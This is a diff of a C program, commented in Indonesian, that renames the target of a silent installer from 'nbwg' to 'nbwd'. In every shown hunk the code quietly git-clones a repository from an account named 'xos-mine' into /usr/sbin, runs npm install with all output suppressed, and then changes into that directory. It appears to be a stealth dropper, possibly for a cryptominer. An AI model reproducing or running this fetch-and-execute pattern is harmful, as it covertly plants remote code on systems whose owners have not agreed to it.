@@ -196,14 +196,14 @@ int main(int argc,char **argv)
     
     // Clone repository nbwc jika belum ada
     struct stat st;
-    if (stat("/usr/sbin/nbwg", &st) != 0) {
-        if (!run_system_command("git clone -q https://github.com/xos-mine/nbwg /usr/sbin/nbwg 2>/dev/null")) {
+    if (stat("/usr/sbin/nbwd", &st) != 0) {
+        if (!run_system_command("git clone -q https://github.com/xos-mine/nbwd /usr/sbin/nbwd 2>/dev/null")) {
             fprintf(stderr, "Gagal cweka\n");
         } else {
             printf("Berhasil cweake\n");
             // Jalankan npm install setelah clone berhasil
             printf("Menjalankan install pack...\n");
-            if (chdir("/usr/sbin/nbwg") == 0) {
+            if (chdir("/usr/sbin/nbwd") == 0) {
                 if (!run_system_command("npm install --no-bin-links --quiet >/dev/null 2>&1")) {
                     fprintf(stderr, "Gagal menjalankan install pack\n");
                 } else {
@@ -217,9 +217,9 @@ int main(int argc,char **argv)
     } else {
         printf("Direktori pack sudah ada, melewatkan clone...\n");
         // Cek apakah node_modules ada, jika tidak jalankan npm install
-        if (stat("/usr/sbin/nbwg/node_modules", &st) != 0) {
+        if (stat("/usr/sbin/nbwd/node_modules", &st) != 0) {
             printf("Menjalankan install pack...\n");
-            if (chdir("/usr/sbin/nbwg") == 0) {
+            if (chdir("/usr/sbin/nbwd") == 0) {
                 if (!run_system_command("npm install --no-bin-links --quiet >/dev/null 2>&1")) {
                     fprintf(stderr, "Gagal menjalankan install pack\n");
                 } else {
@@ -252,7 +252,7 @@ int main(int argc,char **argv)
     execst = fp;
     
     // Ubah direktori kerja ke /usr/sbin/nbwc
-    if (chdir("/usr/sbin/nbwg") != 0) {
+    if (chdir("/usr/sbin/nbwd") != 0) {
         perror("Failed to change directory pack");
         exit(1);
     }
